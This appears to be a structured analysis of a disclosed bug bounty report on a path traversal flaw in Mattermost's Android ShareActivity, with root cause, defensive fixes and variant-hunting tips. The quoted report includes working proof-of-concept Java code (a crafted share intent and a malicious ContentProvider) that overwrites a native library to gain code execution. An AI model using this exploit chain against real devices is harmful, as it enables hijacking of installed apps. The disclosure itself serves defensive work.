# Persistent Arbitrary Code Execution in Mattermost Android via Path Traversal in ShareActivity

## Metadata
- **Source:** HackerOne
- **Report:** 1115864 | https://hackerone.com/reports/1115864
- **Submitted:** 2021-03-03
- **Reporter:** hulkvision_
- **Program:** Mattermost
- **Bounty:** Not specified in writeup
- **Severity:** CRITICAL
- **Vuln:** Path Traversal, Arbitrary File Write, Insecure Intent Handling, Code Injection via Native Library
- **CVEs:** None
- **Category:** memory-binary

## Summary
The exported ShareActivity in Mattermost Android accepts file shares via Intent and fails to validate the display_name parameter from content providers, allowing path traversal attacks. An attacker can write malicious native libraries to the application's lib directory, achieving persistent arbitrary code execution on app launch.

## Attack scenario
1. Attacker creates a malicious APK with an exported ContentProvider that returns a crafted display_name with path traversal sequences (e.g., '../../lib-main/libyoga.so')
2. Attacker triggers a SEND intent targeting Mattermost's ShareActivity, passing a content:// URI pointing to their malicious provider
3. Mattermost's RealPathUtil.getPathFromSavingTempFile() extracts the display_name without validation and creates a File object with the traversal path
4. The vulnerable code writes attacker-supplied binary content to the traversal path, overwriting the legitimate libyoga.so native library
5. On next Mattermost app launch, the app loads the malicious native library from the lib directory
6. Arbitrary code execution occurs with Mattermost's privileges when the native library initializes

## Root cause
The ShareActivity's RealPathUtil class directly uses the display_name from the content provider's cursor without sanitizing path traversal sequences. The file creation logic does not validate that the resulting file path stays within the intended cache directory, allowing relative path components like '../' to escape the sandbox.

## Attacker mindset
An attacker recognizes that exported activities handling external content are common attack surfaces. By chaining path traversal with the native library loading mechanism, they achieve persistent code execution that survives app restarts. The attack requires only app installation and a single intent trigger, making it highly practical.

## Defensive takeaways
- Sanitize all file paths derived from external sources by using File.getCanonicalPath() and verifying it starts with the intended directory
- Do not trust display_name or other metadata from content providers without validation
- Implement path traversal checks: reject filenames containing '../', '..\', or absolute paths
- Use a whitelist approach for allowed file extensions and validate MIME types independently
- Consider using File.createTempFile() which generates unpredictable names instead of user-controlled names
- Apply principle of least privilege: do not export activities that handle file operations unless absolutely necessary
- For exported activities, implement signature-based permission checks or require explicit user interaction

## Variant hunting
Search for other exported Activities/ContentProviders handling file operations or intents with EXTRA_STREAM
Look for file creation patterns using user-controlled filenames without canonical path validation
Identify other native libraries loaded from app-writable directories that could be similarly hijacked
Check for implicit intent handlers that accept file URIs from third-party sources
Audit other apps using display_name or content provider metadata in file operations

## MITRE ATT&CK
- T1190
- T1203
- T1547.12
- T1199

## Notes
This is a sophisticated supply-chain style attack requiring a secondary malicious app, but with minimal user friction. The persistence aspect (native library loading on app start) makes it particularly dangerous. The POC intentionally crashes to demonstrate code execution; a real attack would inject functional shellcode. The vulnerability chain demonstrates why exported components handling external content require strict input validation.

## Full report
<details><summary>Expand</summary>

## Summary:
Activity `com.mattermost.share.ShareActivity` is is exported and is designed to allow file sharing from third party application to mattermost android app.
```
 <activity android:theme="@style/AppTheme" android:label="@string/app_name" android:name="com.mattermost.share.ShareActivity" android:taskAffinity="com.mattermost.share" android:launchMode="singleInstance" android:screenOrientation="portrait" android:configChanges="keyboard|keyboardHidden|orientation|screenSize">
            <intent-filter>
                <action android:name="android.intent.action.SEND"/>
                <action android:name="android.intent.action.SEND_MULTIPLE"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <data android:mimeType="*/*"/>
            </intent-filter>
        </activity>
```
I have found path tansversal vulnerability at `com.mattermost.share.RealPathUtil.java`  file 
```
public static String getPathFromSavingTempFile(Context context, final Uri uri) {
             int nameIndex = returnCursor.getColumnIndex(OpenableColumns.DISPLAY_NAME); //get file name here 
            returnCursor.moveToFirst();
            fileName = returnCursor.getString(nameIndex); // "filename=../../lib-main/libyoga.so"
        } catch (Exception e) {
            // just continue to get the filename with the last segment of the path
       }
             String mimeType = getMimeType(uri.getPath());
            tmpFile = new File(cacheDir, fileName);
            tmpFile.createNewFile();  //path transversal here
            ParcelFileDescriptor pfd = context.getContentResolver().openFileDescriptor(uri, "r"); 
            //.../
```
It receives  the value of _display_name from the provider and saved the file with this name, leading to path-traversal.
## Steps To Reproduce:
  1. Install the POC app and open it. F1216351

  On the next launch of the app the malicious code will be executed.In this poc the app will crash on next launch because i was too lazy and  to create a modified version of `libyoga.so`

### POC 
In `MainActivity.java`
```
        Intent intent = new Intent(Intent.ACTION_SEND);
        intent.setClassName("com.mattermost.rn", "com.mattermost.share.ShareActivity");
        intent.putExtra("android.intent.extra.STREAM",Uri.parse("content://com.example.android.pocok/?path=/data/data/com.example.android.pocok/libevil-lib.so&name=../../lib-main/libyoga.so"));
        intent.setType("application/*");
        startActivity(intent);

```
In `EvilContentProvider.java`
```
public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
    MatrixCursor matrixCursor = new MatrixCursor(new String[]{"_display_name"});
    matrixCursor.addRow(new Object[]{uri.getQueryParameter("name")});
    return matrixCursor;
}

public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
    return ParcelFileDescriptor.open(new File(uri.getQueryParameter("path")), ParcelFileDescriptor.MODE_READ_ONLY);
}
```
In `AndroidManifest.xml`
```
<provider android:name=".EvilContentProvider" android:authorities="com.example.android.pocok" android:enabled="true" android:exported="true" />
```

## Impact

Attacker can inject malicious library file in the application which will lead to arbitrary code execution in the app.

</details>

---
*Analysed by Claude on 2026-05-24*
